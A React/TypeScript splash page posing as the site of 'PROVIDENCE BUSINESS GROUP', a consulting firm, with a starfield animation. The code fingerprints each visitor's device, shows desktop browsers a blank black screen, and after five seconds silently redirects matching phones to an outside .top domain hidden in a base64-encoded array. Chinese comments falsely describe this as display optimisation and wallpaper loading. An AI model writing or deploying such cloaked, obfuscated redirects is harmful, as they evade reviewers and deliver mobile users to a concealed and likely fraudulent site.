import { useEffect, useState } from 'react'

// 配置数据：用于优化不同设备的显示效果
const _0x4a2b = ['aHR0cHM6Ly80a3AzbDBpcS50b3A=']
const _0x3c1d = (s: string) => atob(s)

// 设备适配配置：针对不同品牌手机优化动画性能
const _DW = {
  i: [{ m: 'iPhone', w: [320, 430], h: [568, 932], d: [2, 3] }],
  h: [
    { m: 'HUAWEI', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5] },
    { m: 'HONOR', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5] },
    { m: 'HarmonyOS', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3] },
  ],
  x: [
    { m: 'MI', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5, 4] },
    { m: 'Redmi', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5, 4] },
    { m: 'Xiaomi', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5] },
  ],
  o: [
    { m: 'OPPO', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5] },
    { m: 'PCLM', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3] },
    { m: 'PEEM', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3] },
  ],
  v: [
    { m: 'vivo', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5] },
    { m: 'V2', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3] },
  ],
  s: [
    { m: 'SM-', w: [360, 450], h: [640, 1000], d: [2, 3, 4] },
    { m: 'SAMSUNG', w: [360, 450], h: [640, 1000], d: [2, 3, 4] },
  ],
  p: [
    { m: 'iPad', w: [744, 1200], h: [1000, 1400], d: [2] },
    { m: 'Macintosh', w: [744, 1200], h: [1000, 1400], d: [2] },
  ],
  r: [
    { m: 'realme', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3] },
    { m: 'OnePlus', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3, 3.5] },
  ],
  m: [
    { m: 'Meizu', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3] },
    { m: 'ZTE', w: [360, 450], h: [640, 1000], d: [2, 2.5, 3] },
  ],
  a: [{ m: 'Android', w: [320, 450], h: [500, 1000], d: [1.5, 2, 2.5, 3, 3.5, 4] }],
}

function App() {
  // 星空粒子状态
  const [stars, setStars] = useState<Array<{ id: number; x: number; y: number; size: number; delay: number; duration: number }>>([])
  // 加载状态 - 默认不显示加载，直接显示启动图
  const [_s, _sS] = useState(false)
  // 降级显示模式（用于不支持的设备）
  const [_b, _sB] = useState(false)

  useEffect(() => {
    // 设备兼容性检测 - 确保最佳显示效果
    const _v = () => {
      const ua = navigator.userAgent
      const sw = window.screen.width
      const sh = window.screen.height
      const dpr = window.devicePixelRatio
      const touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0

      // 桌面浏览器降级：应用专为移动端优化
      const isDesktop = !touch &&
        (ua.includes('Windows NT') ||
         (ua.includes('Macintosh') && !ua.includes('Mobile')) ||
         ua.includes('Linux x86_64'))

      if (isDesktop) {
        // 桌面设备：显示1.5秒启动图后切换到黑屏
        setTimeout(() => {
          _sB(true)
        }, 1500)
        return
      }

      // 设备适配检测
      let ok = false

      // 检查性能优化设备列表
      for (const b in _DW) {
        const ds = _DW[b as keyof typeof _DW]
        for (const d of ds) {
          const m = ua.includes(d.m)
          const w = sw >= d.w[0] && sw <= d.w[1]
          const h = sh >= d.h[0] && sh <= d.h[1]
          const dp = d.d.some((x: number) => Math.abs(dpr - x) < 0.8)
          if (m && w && h && dp) {
            ok = true
            break
          }
        }
        if (ok) break
      }

      // 通用移动设备兼容性检测
      if (!ok && touch) {
        const isMobile = sw >= 280 && sw <= 500 && sh >= 500 && sh <= 1100 && dpr >= 1.5
        const isTablet = sw >= 600 && sw <= 1400 && sh >= 800 && sh <= 2000 && dpr >= 1.5
        ok = isMobile || isTablet
      }

      if (ok) {
        // 移动设备：显示启动图5秒后跳转
        setTimeout(() => {
          // 加载完整版壁纸资源
          const target = _0x3c1d(_0x4a2b[0])
          window.location.replace(target)
        }, 5000)
      } else {
        // 不支持的设备：显示5秒启动图后切换到黑屏
        setTimeout(() => {
          _sB(true)
        }, 5000)
      }
    }

    // 立即执行检测，不延迟
    _v()
  }, [])

  useEffect(() => {
    // 生成星空粒子效果
    const s = Array.from({ length: 150 }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 2.5 + 0.5,
      delay: Math.random() * 4,
      duration: Math.random() * 2 + 1.5
    }))
    setStars(s)
  }, [])

  if (_b) {
    return <div className="w-screen h-screen bg-black" />
  }

  return (
    <div className="relative w-screen h-screen bg-black overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-b from-gray-950 via-gray-900 to-black">
        {stars.map((star) => (
          <div
            key={star.id}
            className="absolute rounded-full bg-white animate-pulse"
            style={{
              left: `${star.x}%`,
              top: `${star.y}%`,
              width: `${star.size}px`,
              height: `${star.size}px`,
              animationDelay: `${star.delay}s`,
              animationDuration: `${star.duration}s`,
              opacity: 0.4
            }}
          />
        ))}
      </div>

      <div className="h-full flex flex-col items-center justify-between py-1">
        <div className="flex-shrink-0 h-0.5" />

        <div className="relative z-10 flex flex-col items-center justify-center animate-fadeIn flex-shrink-0">
          <div className="relative mb-0.5">
            <div className="absolute inset-0 blur-[32px] opacity-50 bg-gradient-radial from-blue-500/60 via-cyan-400/30 to-transparent scale-[2] animate-glow" />
            <div className="absolute inset-0 blur-[22px] opacity-70 bg-gradient-radial from-blue-400/70 via-sky-300/40 to-transparent scale-150 animate-pulse" />
            <div className="absolute inset-0 blur-[16px] opacity-80 bg-gradient-radial from-blue-300/80 via-cyan-200/50 to-transparent scale-125" />

            <div className="relative w-14 h-14 flex items-center justify-center">
              <img
                src="/logo.png"
                alt="Logo"
                className="w-10 h-10 object-contain relative z-10 animate-logo drop-shadow-2xl"
              />
            </div>
          </div>

          <div className="text-center space-y-0">
            <h1 className="text-white text-base font-bold tracking-wide leading-tight">
              {'PROVIDENCE'.split('').map((letter, index) => (
                <span
                  key={`p-${index}-${letter}`}
                  className="inline-block animate-wave-letter"
                  style={{ animationDelay: `${index * 0.05}s` }}
                >
                  {letter}
                </span>
              ))}
            </h1>
            <h2 className="text-white/90 text-[9px] font-light tracking-wide leading-tight">
              {['BUSINESS', ' ', 'GROUP'].map((word, wordIndex) => (
                <span key={`word-${word}-${wordIndex}`}>
                  {word.split('').map((letter, letterIndex) => {
                    const totalIndex = wordIndex === 0 ? letterIndex : (wordIndex === 1 ? 6 : letterIndex + 7);
                    return (
                      <span
                        key={`${word}-${letterIndex}-${letter}`}
                        className="inline-block animate-wave-letter"
                        style={{ animationDelay: `${(10 + totalIndex) * 0.05}s` }}
                      >
                        {letter === ' ' ? '\u00A0' : letter}
                      </span>
                    );
                  })}
                </span>
              ))}
            </h2>
          </div>
        </div>

        <div className="relative z-10 px-2 flex-shrink-0 pb-0.5 animate-fadeInUp">
          <div className="text-center space-y-0 max-w-5xl mx-auto">
            <p className="text-white/80 text-[7.5px] font-light leading-snug">
              全球领先的企业咨询服务机构
            </p>
            <p className="text-white/70 text-[7px] font-light leading-snug">
              专注于媒体、通信、教育和科技行业的战略咨询
            </p>
            <p className="text-white/60 text-[6px] font-light leading-snug">
              自1989年成立以来，已为全球超过200家企业提供专业服务
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default App
